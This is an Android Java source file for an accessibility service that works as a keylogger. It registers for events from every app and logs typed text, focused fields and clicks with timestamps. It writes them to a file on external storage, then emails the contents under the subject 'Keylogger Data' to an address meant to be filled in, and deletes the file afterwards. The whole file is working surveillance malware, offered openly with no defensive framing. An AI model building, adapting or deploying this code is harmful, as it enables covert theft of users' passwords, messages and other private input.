package com.rahulp.test;
import java.io.BufferedReader;
import  java.io.File;
import java.io.FileOutputStream;
import android.accessibilityservice.AccessibilityService;
import java.io.FileReader;
import java.util.Calendar;
import java.text.SimpleDateFormat;
import java.text.DateFormat;
import java.util.Locale;
import java.util.logging.Level;
import java.util.logging.Logger;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import com.rahulp.test.model.Employee;
import com.rahulp.test.reotrfit.EmployeeApi;
import com.rahulp.test.reotrfit.RetrofitService;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;


public class testService extends AccessibilityService {
    public String res = "";

    private LocationManager locationManager;

    private String packageName;

    @Override
    public void onServiceConnected() {
        Log.v("Connected :", "Onservice() Connected...");

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.notificationTimeout = 100;
        info.packageNames = null;
        setServiceInfo(info);

        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        DateFormat df = new SimpleDateFormat("hh:mm:ss");
        String time = df.format(Calendar.getInstance().getTime());

        switch (event.getEventType()) {

            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: {
                packageName = event.getPackageName().toString();
                Log.v("OP: ", packageName);
            }

            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String data = event.getText().toString();

                data="("+time+"|TEXT)" + data;
                res = res + data + "\n";

                Log.v("OP: ", "("+time+"|TEXT)" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String data = event.getText().toString();

                data="("+time+"|FOCUSED)" + data;
                res = res + data + "\n";

                Log.v("OP: ", "("+time+"|FOCUSED)" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = event.getText().toString();
                data=time + "("+time+"|CLICKED)" + event.getText().toString() + data;
                res = res + data + "\n";

                Log.v("OP: ", "("+time+"|CLICKED)" + event.getPackageName().toString() + data);

//                if (res.length() > 10) {
                    try {

                        File file = new File(getApplicationContext().getExternalFilesDir(null), "Log.txt");
                        FileOutputStream fos = new FileOutputStream(file, true);
                        fos.write(res.getBytes());
                        fos.close();

                        double fsize = (double) file.length() / 1024;
                        ConnectivityManager conMgr = (ConnectivityManager) getSystemService(getApplicationContext().CONNECTIVITY_SERVICE);


//                        if (fsize > 0.2) {

//                            if (conMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState() == NetworkInfo.State.CONNECTED
//                                    || conMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState() == NetworkInfo.State.CONNECTED) {

                                StringBuilder text = new StringBuilder();
                                BufferedReader br = new BufferedReader(new FileReader(file));
                                String line;

                                while ((line = br.readLine()) != null) {
                                    text.append(line);
                                    text.append('\n');
                                    }
                                br.close();

                                //Creating SendMail object
                                try {



                                    SendMail sm = new SendMail(this, "XXXXX", "Keylogger Data", text.toString(), packageName); //Change XXXX by email adress where to send

                                    sm.execute();
                                    file.delete();
                                }
                                catch (Exception e){
                                    Log.v("err","Error while sending mail:"+e.getMessage());
                                }
//                            }
//                        }

                    } catch (Exception e) {
                        Log.v("msg", e.getMessage());
                    }

                    res = "";
//                }

                break;
            }
            default:
                break;
        }


    }

    @Override
    public void onInterrupt() {
        Log.d("Interrupt", "onInterrupt() is Called...");
    }


}